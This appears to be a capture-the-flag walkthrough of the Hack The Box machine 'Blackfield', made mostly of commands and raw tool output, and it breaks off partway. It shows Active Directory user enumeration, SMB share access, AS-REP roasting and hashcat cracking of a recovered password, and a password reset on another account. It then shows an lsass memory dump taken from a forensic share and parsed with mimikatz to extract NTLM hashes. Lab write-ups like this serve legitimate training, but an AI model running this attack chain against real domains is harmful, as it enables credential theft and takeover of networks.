1208: BLACKFIELD\BLACKFIELD569653 (SidTypeUser)
1209: BLACKFIELD\BLACKFIELD759079 (SidTypeUser)
1210: BLACKFIELD\BLACKFIELD488531 (SidTypeUser)
1211: BLACKFIELD\BLACKFIELD160610 (SidTypeUser)
1212: BLACKFIELD\BLACKFIELD586934 (SidTypeUser)
1213: BLACKFIELD\BLACKFIELD819822 (SidTypeUser)
1214: BLACKFIELD\BLACKFIELD739765 (SidTypeUser)
1215: BLACKFIELD\BLACKFIELD875008 (SidTypeUser)
1216: BLACKFIELD\BLACKFIELD441759 (SidTypeUser)
1217: BLACKFIELD\BLACKFIELD763893 (SidTypeUser)
1218: BLACKFIELD\BLACKFIELD713470 (SidTypeUser)
1219: BLACKFIELD\BLACKFIELD131771 (SidTypeUser)
1220: BLACKFIELD\BLACKFIELD793029 (SidTypeUser)
1221: BLACKFIELD\BLACKFIELD694429 (SidTypeUser)
1222: BLACKFIELD\BLACKFIELD802251 (SidTypeUser)
1223: BLACKFIELD\BLACKFIELD602567 (SidTypeUser)
1224: BLACKFIELD\BLACKFIELD328983 (SidTypeUser)
1225: BLACKFIELD\BLACKFIELD990638 (SidTypeUser)
1226: BLACKFIELD\BLACKFIELD350809 (SidTypeUser)
1227: BLACKFIELD\BLACKFIELD405242 (SidTypeUser)
1228: BLACKFIELD\BLACKFIELD267457 (SidTypeUser)
1229: BLACKFIELD\BLACKFIELD686428 (SidTypeUser)
1230: BLACKFIELD\BLACKFIELD478828 (SidTypeUser)
1231: BLACKFIELD\BLACKFIELD129387 (SidTypeUser)
1232: BLACKFIELD\BLACKFIELD544934 (SidTypeUser)
1233: BLACKFIELD\BLACKFIELD115148 (SidTypeUser)
1234: BLACKFIELD\BLACKFIELD753537 (SidTypeUser)
1235: BLACKFIELD\BLACKFIELD416532 (SidTypeUser)
1236: BLACKFIELD\BLACKFIELD680939 (SidTypeUser)
1237: BLACKFIELD\BLACKFIELD732035 (SidTypeUser)
1238: BLACKFIELD\BLACKFIELD522135 (SidTypeUser)
1239: BLACKFIELD\BLACKFIELD773423 (SidTypeUser)
1240: BLACKFIELD\BLACKFIELD371669 (SidTypeUser)
1241: BLACKFIELD\BLACKFIELD252379 (SidTypeUser)
1242: BLACKFIELD\BLACKFIELD828826 (SidTypeUser)
1243: BLACKFIELD\BLACKFIELD548394 (SidTypeUser)
1244: BLACKFIELD\BLACKFIELD611993 (SidTypeUser)
1245: BLACKFIELD\BLACKFIELD192642 (SidTypeUser)
1246: BLACKFIELD\BLACKFIELD106360 (SidTypeUser)
1247: BLACKFIELD\BLACKFIELD939243 (SidTypeUser)
1248: BLACKFIELD\BLACKFIELD230515 (SidTypeUser)
1249: BLACKFIELD\BLACKFIELD774376 (SidTypeUser)
1250: BLACKFIELD\BLACKFIELD576233 (SidTypeUser)
1251: BLACKFIELD\BLACKFIELD676303 (SidTypeUser)
1252: BLACKFIELD\BLACKFIELD673073 (SidTypeUser)
1253: BLACKFIELD\BLACKFIELD558867 (SidTypeUser)
1254: BLACKFIELD\BLACKFIELD184482 (SidTypeUser)
1255: BLACKFIELD\BLACKFIELD724669 (SidTypeUser)
1256: BLACKFIELD\BLACKFIELD765350 (SidTypeUser)
1257: BLACKFIELD\BLACKFIELD411132 (SidTypeUser)
1258: BLACKFIELD\BLACKFIELD128775 (SidTypeUser)
1259: BLACKFIELD\BLACKFIELD704154 (SidTypeUser)
1260: BLACKFIELD\BLACKFIELD107197 (SidTypeUser)
1261: BLACKFIELD\BLACKFIELD994577 (SidTypeUser)
1262: BLACKFIELD\BLACKFIELD683323 (SidTypeUser)
1263: BLACKFIELD\BLACKFIELD433476 (SidTypeUser)
1264: BLACKFIELD\BLACKFIELD644281 (SidTypeUser)
1265: BLACKFIELD\BLACKFIELD195953 (SidTypeUser)
1266: BLACKFIELD\BLACKFIELD868068 (SidTypeUser)
1267: BLACKFIELD\BLACKFIELD690642 (SidTypeUser)
1268: BLACKFIELD\BLACKFIELD465267 (SidTypeUser)
1269: BLACKFIELD\BLACKFIELD199889 (SidTypeUser)
1270: BLACKFIELD\BLACKFIELD468839 (SidTypeUser)
1271: BLACKFIELD\BLACKFIELD348835 (SidTypeUser)
1272: BLACKFIELD\BLACKFIELD624385 (SidTypeUser)
1273: BLACKFIELD\BLACKFIELD818863 (SidTypeUser)
1274: BLACKFIELD\BLACKFIELD939200 (SidTypeUser)
1275: BLACKFIELD\BLACKFIELD135990 (SidTypeUser)
1276: BLACKFIELD\BLACKFIELD484290 (SidTypeUser)
1277: BLACKFIELD\BLACKFIELD898237 (SidTypeUser)
1278: BLACKFIELD\BLACKFIELD773118 (SidTypeUser)
1279: BLACKFIELD\BLACKFIELD148067 (SidTypeUser)
1280: BLACKFIELD\BLACKFIELD390179 (SidTypeUser)
1281: BLACKFIELD\BLACKFIELD359278 (SidTypeUser)
1282: BLACKFIELD\BLACKFIELD375924 (SidTypeUser)
1283: BLACKFIELD\BLACKFIELD533060 (SidTypeUser)
1284: BLACKFIELD\BLACKFIELD534196 (SidTypeUser)
1285: BLACKFIELD\BLACKFIELD639103 (SidTypeUser)
1286: BLACKFIELD\BLACKFIELD933887 (SidTypeUser)
1287: BLACKFIELD\BLACKFIELD907614 (SidTypeUser)
1288: BLACKFIELD\BLACKFIELD991588 (SidTypeUser)
1289: BLACKFIELD\BLACKFIELD781404 (SidTypeUser)
1290: BLACKFIELD\BLACKFIELD787995 (SidTypeUser)
1291: BLACKFIELD\BLACKFIELD911926 (SidTypeUser)
1292: BLACKFIELD\BLACKFIELD146200 (SidTypeUser)
1293: BLACKFIELD\BLACKFIELD826622 (SidTypeUser)
1294: BLACKFIELD\BLACKFIELD171624 (SidTypeUser)
1295: BLACKFIELD\BLACKFIELD497216 (SidTypeUser)
1296: BLACKFIELD\BLACKFIELD839613 (SidTypeUser)
1297: BLACKFIELD\BLACKFIELD428532 (SidTypeUser)
1298: BLACKFIELD\BLACKFIELD697473 (SidTypeUser)
1299: BLACKFIELD\BLACKFIELD291678 (SidTypeUser)
1300: BLACKFIELD\BLACKFIELD623122 (SidTypeUser)
1301: BLACKFIELD\BLACKFIELD765982 (SidTypeUser)
1302: BLACKFIELD\BLACKFIELD701303 (SidTypeUser)
1303: BLACKFIELD\BLACKFIELD250576 (SidTypeUser)
1304: BLACKFIELD\BLACKFIELD971417 (SidTypeUser)
1305: BLACKFIELD\BLACKFIELD160820 (SidTypeUser)
1306: BLACKFIELD\BLACKFIELD385928 (SidTypeUser)
1307: BLACKFIELD\BLACKFIELD848660 (SidTypeUser)
1308: BLACKFIELD\BLACKFIELD682842 (SidTypeUser)
1309: BLACKFIELD\BLACKFIELD813266 (SidTypeUser)
1310: BLACKFIELD\BLACKFIELD274577 (SidTypeUser)
1311: BLACKFIELD\BLACKFIELD448641 (SidTypeUser)
1312: BLACKFIELD\BLACKFIELD318077 (SidTypeUser)
1313: BLACKFIELD\BLACKFIELD289513 (SidTypeUser)
1314: BLACKFIELD\BLACKFIELD336573 (SidTypeUser)
1315: BLACKFIELD\BLACKFIELD962495 (SidTypeUser)
1316: BLACKFIELD\BLACKFIELD566117 (SidTypeUser)
1317: BLACKFIELD\BLACKFIELD617630 (SidTypeUser)
1318: BLACKFIELD\BLACKFIELD717683 (SidTypeUser)
1319: BLACKFIELD\BLACKFIELD390192 (SidTypeUser)
1320: BLACKFIELD\BLACKFIELD652779 (SidTypeUser)
1321: BLACKFIELD\BLACKFIELD665997 (SidTypeUser)
1322: BLACKFIELD\BLACKFIELD998321 (SidTypeUser)
1323: BLACKFIELD\BLACKFIELD946509 (SidTypeUser)
1324: BLACKFIELD\BLACKFIELD228442 (SidTypeUser)
1325: BLACKFIELD\BLACKFIELD548464 (SidTypeUser)
1326: BLACKFIELD\BLACKFIELD586592 (SidTypeUser)
1327: BLACKFIELD\BLACKFIELD512331 (SidTypeUser)
1328: BLACKFIELD\BLACKFIELD609423 (SidTypeUser)
1329: BLACKFIELD\BLACKFIELD395725 (SidTypeUser)
1330: BLACKFIELD\BLACKFIELD438923 (SidTypeUser)
1331: BLACKFIELD\BLACKFIELD691480 (SidTypeUser)
1332: BLACKFIELD\BLACKFIELD236467 (SidTypeUser)
1333: BLACKFIELD\BLACKFIELD895235 (SidTypeUser)
1334: BLACKFIELD\BLACKFIELD788523 (SidTypeUser)
1335: BLACKFIELD\BLACKFIELD710285 (SidTypeUser)
1336: BLACKFIELD\BLACKFIELD357023 (SidTypeUser)
1337: BLACKFIELD\BLACKFIELD362337 (SidTypeUser)
1338: BLACKFIELD\BLACKFIELD651599 (SidTypeUser)
1339: BLACKFIELD\BLACKFIELD579344 (SidTypeUser)
1340: BLACKFIELD\BLACKFIELD859776 (SidTypeUser)
1341: BLACKFIELD\BLACKFIELD789969 (SidTypeUser)
1342: BLACKFIELD\BLACKFIELD356727 (SidTypeUser)
1343: BLACKFIELD\BLACKFIELD962999 (SidTypeUser)
1344: BLACKFIELD\BLACKFIELD201655 (SidTypeUser)
1345: BLACKFIELD\BLACKFIELD635996 (SidTypeUser)
1346: BLACKFIELD\BLACKFIELD478410 (SidTypeUser)
1347: BLACKFIELD\BLACKFIELD518316 (SidTypeUser)
1348: BLACKFIELD\BLACKFIELD202900 (SidTypeUser)
1349: BLACKFIELD\BLACKFIELD767498 (SidTypeUser)
1350: BLACKFIELD\BLACKFIELD103974 (SidTypeUser)
1351: BLACKFIELD\BLACKFIELD135403 (SidTypeUser)
1352: BLACKFIELD\BLACKFIELD112766 (SidTypeUser)
1353: BLACKFIELD\BLACKFIELD978938 (SidTypeUser)
1354: BLACKFIELD\BLACKFIELD871753 (SidTypeUser)
1355: BLACKFIELD\BLACKFIELD136203 (SidTypeUser)
1356: BLACKFIELD\BLACKFIELD634593 (SidTypeUser)
1357: BLACKFIELD\BLACKFIELD274367 (SidTypeUser)
1358: BLACKFIELD\BLACKFIELD520852 (SidTypeUser)
1359: BLACKFIELD\BLACKFIELD339143 (SidTypeUser)
1360: BLACKFIELD\BLACKFIELD684814 (SidTypeUser)
1361: BLACKFIELD\BLACKFIELD792484 (SidTypeUser)
1362: BLACKFIELD\BLACKFIELD802875 (SidTypeUser)
1363: BLACKFIELD\BLACKFIELD383108 (SidTypeUser)
1364: BLACKFIELD\BLACKFIELD318250 (SidTypeUser)
1365: BLACKFIELD\BLACKFIELD496547 (SidTypeUser)
1366: BLACKFIELD\BLACKFIELD219914 (SidTypeUser)
1367: BLACKFIELD\BLACKFIELD454313 (SidTypeUser)
1368: BLACKFIELD\BLACKFIELD460131 (SidTypeUser)
1369: BLACKFIELD\BLACKFIELD613771 (SidTypeUser)
1370: BLACKFIELD\BLACKFIELD632329 (SidTypeUser)
1371: BLACKFIELD\BLACKFIELD402639 (SidTypeUser)
1372: BLACKFIELD\BLACKFIELD235930 (SidTypeUser)
1373: BLACKFIELD\BLACKFIELD246388 (SidTypeUser)
1374: BLACKFIELD\BLACKFIELD946435 (SidTypeUser)
1375: BLACKFIELD\BLACKFIELD739227 (SidTypeUser)
1376: BLACKFIELD\BLACKFIELD827906 (SidTypeUser)
1377: BLACKFIELD\BLACKFIELD198927 (SidTypeUser)
1378: BLACKFIELD\BLACKFIELD169876 (SidTypeUser)
1379: BLACKFIELD\BLACKFIELD150357 (SidTypeUser)
1380: BLACKFIELD\BLACKFIELD594619 (SidTypeUser)
1381: BLACKFIELD\BLACKFIELD274109 (SidTypeUser)
1382: BLACKFIELD\BLACKFIELD682949 (SidTypeUser)
1383: BLACKFIELD\BLACKFIELD316850 (SidTypeUser)
1384: BLACKFIELD\BLACKFIELD884808 (SidTypeUser)
1385: BLACKFIELD\BLACKFIELD327610 (SidTypeUser)
1386: BLACKFIELD\BLACKFIELD899238 (SidTypeUser)
1387: BLACKFIELD\BLACKFIELD184493 (SidTypeUser)
1388: BLACKFIELD\BLACKFIELD631162 (SidTypeUser)
1389: BLACKFIELD\BLACKFIELD591846 (SidTypeUser)
1390: BLACKFIELD\BLACKFIELD896715 (SidTypeUser)
1391: BLACKFIELD\BLACKFIELD500073 (SidTypeUser)
1392: BLACKFIELD\BLACKFIELD584113 (SidTypeUser)
1393: BLACKFIELD\BLACKFIELD204805 (SidTypeUser)
1394: BLACKFIELD\BLACKFIELD842593 (SidTypeUser)
1395: BLACKFIELD\BLACKFIELD397679 (SidTypeUser)
1396: BLACKFIELD\BLACKFIELD842438 (SidTypeUser)
1397: BLACKFIELD\BLACKFIELD286615 (SidTypeUser)
1398: BLACKFIELD\BLACKFIELD224839 (SidTypeUser)
1399: BLACKFIELD\BLACKFIELD631599 (SidTypeUser)
1400: BLACKFIELD\BLACKFIELD247450 (SidTypeUser)
1401: BLACKFIELD\BLACKFIELD290582 (SidTypeUser)
1402: BLACKFIELD\BLACKFIELD657263 (SidTypeUser)
1403: BLACKFIELD\BLACKFIELD314351 (SidTypeUser)
1404: BLACKFIELD\BLACKFIELD434395 (SidTypeUser)
1405: BLACKFIELD\BLACKFIELD410243 (SidTypeUser)
1406: BLACKFIELD\BLACKFIELD307633 (SidTypeUser)
1407: BLACKFIELD\BLACKFIELD758945 (SidTypeUser)
1408: BLACKFIELD\BLACKFIELD541148 (SidTypeUser)
1409: BLACKFIELD\BLACKFIELD532412 (SidTypeUser)
1410: BLACKFIELD\BLACKFIELD996878 (SidTypeUser)
1411: BLACKFIELD\BLACKFIELD653097 (SidTypeUser)
1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)
1413: BLACKFIELD\svc_backup (SidTypeUser)
1414: BLACKFIELD\lydericlefebvre (SidTypeUser)
1415: BLACKFIELD\PC01$ (SidTypeUser)
1416: BLACKFIELD\PC02$ (SidTypeUser)
1417: BLACKFIELD\PC03$ (SidTypeUser)
1418: BLACKFIELD\PC04$ (SidTypeUser)
1419: BLACKFIELD\PC05$ (SidTypeUser)
1420: BLACKFIELD\PC06$ (SidTypeUser)
1421: BLACKFIELD\PC07$ (SidTypeUser)
1422: BLACKFIELD\PC08$ (SidTypeUser)
1423: BLACKFIELD\PC09$ (SidTypeUser)
1424: BLACKFIELD\PC10$ (SidTypeUser)
1425: BLACKFIELD\PC11$ (SidTypeUser)
1426: BLACKFIELD\PC12$ (SidTypeUser)
1427: BLACKFIELD\PC13$ (SidTypeUser)
1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)
1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)
1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)
1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)
```
some new users... 
```
nxc smb 10.129.229.17 -u 'lol' -p '' --shares --smb-timeout 10
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\lol: (Guest)
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share
```

so we can also read IPC$
```
kerbrute userenum "/home/kali/HTB BOXES/Blackfield/users.txt" -d blackfield.local --dc 10.129.229.17

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/04/26 - Ronnie Flathers @ropnop

2026/05/04 22:12:26 >  Using KDC(s):
2026/05/04 22:12:26 >   10.129.229.17:88

2026/05/04 22:12:46 >  [+] VALID USERNAME:       audit2020@blackfield.local
2026/05/04 22:14:41 >  [+] VALID USERNAME:       support@blackfield.local
2026/05/04 22:14:46 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2026/05/04 22:15:11 >  Done! Tested 314 usernames (3 valid) in 165.908 seconds
```

only 3 users are valid... 
```
impacket-GetNPUsers blackfield.local/ -usersfile "/home/kali/HTB BOXES/Blackfield/users.txt" -dc-ip 10.129.229.17 -request
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:8b128acc5b00fea1a469b77d39b62d6f$8e0dc30b99782527da8cc67d85a571e4f72b574536c2a01479cdf0880074e77cd5fd43102d8bb8c86d9f0893f404327614fe1abf96eb19debc3ab4c2e52fe7f15de9b620c08da5bbc67ba8346c980b070acf09a9f9a6741b2a2a869be5b89628500b519568aecd8bc23e278e2ae8f6c8ad0f9345c9ad589e34ce434284df0ce6dd391717fd8bf6ef44ed92dc1abe266ea80112066ad42f117af71aa5497af8fcc8de39fdcc2bdabf30b981185e6fd12c2b03f1e36830ad934bab9c65c2c51d160822d58b2f2aa547ed50dfab9acb38fd92d1a2404efeed5d7853f53085f8ca680cef4ea755c46a9ca8643ad39afd4a453081f129
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
lets crack it... 
```
$krb5asrep$23$support@BLACKFIELD.LOCAL:8b128acc5b00fea1a469b77d39b62d6f$8e0dc30b99782527da8cc67d85a571e4f72b574536c2a01479cdf0880074e77cd5fd43102d8bb8c86d9f0893f404327614fe1abf96eb19debc3ab4c2e52fe7f15de9b620c08da5bbc67ba8346c980b070acf09a9f9a6741b2a2a869be5b89628500b519568aecd8bc23e278e2ae8f6c8ad0f9345c9ad589e34ce434284df0ce6dd391717fd8bf6ef44ed92dc1abe266ea80112066ad42f117af71aa5497af8fcc8de39fdcc2bdabf30b981185e6fd12c2b03f1e36830ad934bab9c65c2c51d160822d58b2f2aa547ed50dfab9acb38fd92d1a2404efeed5d7853f53085f8ca680cef4ea755c46a9ca8643ad39afd4a453081f129:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:8b128acc5b00...81f129
Time.Started.....: Mon May  4 22:20:55 2026 (14 secs)
Time.Estimated...: Mon May  4 22:21:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1054.2 kH/s (2.11ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14330880/14344385 (99.91%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: #A1027009 -> #!hrvert
Hardware.Mon.#01.: Util: 60%

Started: Mon May  4 22:20:51 2026
Stopped: Mon May  4 22:21:10 2026

```
 lets get bloodhound files... 
 ```
 nxc smb 10.129.229.17 -u /home/kali/HTB\ BOXES/Blackfield/users.txt -p '#00^BlackKnight' 
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\audit2020:#00^BlackKnight STATUS_LOGON_FAILURE 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
 ```
ok so it was for support.... 
```
rusthound-ce -d blackfield.local -u support@blackfield.local 
---------------------------------------------------
Initializing RustHound-CE at 22:26:12 on 05/04/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-05-04T15:26:12Z INFO  rusthound_ce] Verbosity level: Info
[2026-05-04T15:26:12Z INFO  rusthound_ce] Collection method: All
Password: 
[2026-05-04T15:26:13Z INFO  rusthound_ce::ldap] Connected to BLACKFIELD.LOCAL Active Directory!
[2026-05-04T15:26:13Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-05-04T15:26:14Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-04T15:26:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=BLACKFIELD,DC=local
[2026-05-04T15:26:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-04T15:26:26Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=BLACKFIELD,DC=local
[2026-05-04T15:26:26Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-04T15:26:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
[2026-05-04T15:26:29Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-04T15:26:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=BLACKFIELD,DC=local
[2026-05-04T15:26:29Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-04T15:26:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=BLACKFIELD,DC=local
[2026-05-04T15:26:29Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-05-04T15:26:29Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-05-04T15:26:29Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] 316 users parsed!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] .//20260504222629_blackfield-local_users.json created!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] .//20260504222629_blackfield-local_groups.json created!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] 18 computers parsed!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] .//20260504222629_blackfield-local_computers.json created!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] .//20260504222629_blackfield-local_ous.json created!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] .//20260504222629_blackfield-local_domains.json created!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] .//20260504222629_blackfield-local_gpos.json created!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-05-04T15:26:29Z INFO  rusthound_ce::json::maker::common] .//20260504222629_blackfield-local_containers.json created!

RustHound-CE Enumeration Completed at 22:26:29 on 05/04/26! Happy Graphing!

```

lets look at bloodhound now
support can change pass for audit2020 
so maybe we can access the forensic shares ? 
```
smbclient //10.129.229.17/forensic -U 'audit2020%Password123!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 20:03:16 2020
  ..                                  D        0  Sun Feb 23 20:03:16 2020
  commands_output                     D        0  Mon Feb 24 01:14:37 2020
  memory_analysis                     D        0  Fri May 29 03:28:33 2020
  tools                               D        0  Sun Feb 23 20:39:08 2020

                5102079 blocks of size 4096. 1693964 blocks available

```
```
smb: \> cd commands_output\
smb: \commands_output\> ls
  .                                   D        0  Mon Feb 24 01:14:37 2020
  ..                                  D        0  Mon Feb 24 01:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 20:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 19:51:52 2020
  domain_users.txt                    A    16454  Sat Feb 29 05:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 19:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 19:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 19:51:01 2020
  route.txt                           A     3976  Sun Feb 23 19:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 19:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 19:54:29 2020
```

```
smb: \> cd memory_analysis\
smb: \memory_analysis\> ls
  .                                   D        0  Fri May 29 03:28:33 2020
  ..                                  D        0  Fri May 29 03:28:33 2020
  conhost.zip                         A 37876530  Fri May 29 03:25:36 2020
  ctfmon.zip                          A 24962333  Fri May 29 03:25:45 2020
  dfsrs.zip                           A 23993305  Fri May 29 03:25:54 2020
  dllhost.zip                         A 18366396  Fri May 29 03:26:04 2020
  ismserv.zip                         A  8810157  Fri May 29 03:26:13 2020
  lsass.zip                           A 41936098  Fri May 29 03:25:08 2020
  mmc.zip                             A 64288607  Fri May 29 03:25:25 2020
  RuntimeBroker.zip                   A 13332174  Fri May 29 03:26:24 2020
  ServerManager.zip                   A 131983313  Fri May 29 03:26:49 2020
  sihost.zip                          A 33141744  Fri May 29 03:27:00 2020
  smartscreen.zip                     A 33756344  Fri May 29 03:27:11 2020
  svchost.zip                         A 14408833  Fri May 29 03:27:19 2020
  taskhostw.zip                       A 34631412  Fri May 29 03:27:30 2020
  winlogon.zip                        A 14255089  Fri May 29 03:27:38 2020
  wlms.zip                            A  4067425  Fri May 29 03:27:44 2020
  WmiPrvSE.zip                        A 18303252  Fri May 29 03:27:53 2020

                5102079 blocks of size 4096. 1693692 blocks available
smb: \memory_analysis\> get lsass.zip 
parallel_read returned NT_STATUS_IO_TIMEOUT

smb: \memory_analysis\> 
smb: \memory_analysis\> get lsass.zip 
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (1167.3 KiloBytes/sec) (average 1057.9 KiloBytes/sec)
```

lets have a look what we got 

```
wine /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "sekurlsa::minidump /home/kali/lsass.DMP" "sekurlsa::logonPasswords" exit
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32:i386"
wine: created the configuration directory '/home/kali/.wine'
004c:err:ole:StdMarshalImpl_MarshalInterface Failed to create ifstub, hr 0x80004002
004c:err:ole:CoMarshalInterface Failed to marshal the interface {6d5140c1-7436-11ce-8034-00aa006009fa}, hr 0x80004002
004c:err:ole:apartment_get_local_server_stream Failed: 0x80004002
0054:err:ole:StdMarshalImpl_MarshalInterface Failed to create ifstub, hr 0x80004002
0054:err:ole:CoMarshalInterface Failed to marshal the interface {6d5140c1-7436-11ce-8034-00aa006009fa}, hr 0x80004002
0054:err:ole:apartment_get_local_server_stream Failed: 0x80004002
0054:err:ole:start_rpcss Failed to open RpcSs service
wine: failed to open L"C:\\windows\\syswow64\\rundll32.exe": c0000135
002c:err:setupapi:do_file_copyW Unsupported style(s) 0x10
002c:err:setupapi:do_file_copyW Unsupported style(s) 0x10
0108:err:setupapi:do_file_copyW Unsupported style(s) 0x10
002c:err:setupapi:do_file_copyW Unsupported style(s) 0x10
0108:err:setupapi:do_file_copyW Unsupported style(s) 0x10
0024:err:winediag:ntlm_check_version ntlm_auth was not found. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can find it in the winbind package of your distribution.
0024:err:ntlm:ntlm_LsaApInitializePackage no NTLM support, expect problems

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::minidump /home/kali/lsass.DMP
Switch to MINIDUMP : '/home/kali/lsass.DMP'

mimikatz(commandline) # sekurlsa::logonPasswords
Opening : '/home/kali/lsass.DMP' file for minidump...

Authentication Id : 0 ; 406458 (00000000:000633ba)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 1:00:03 AM
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 365835 (00000000:0005950b)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:59:38 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
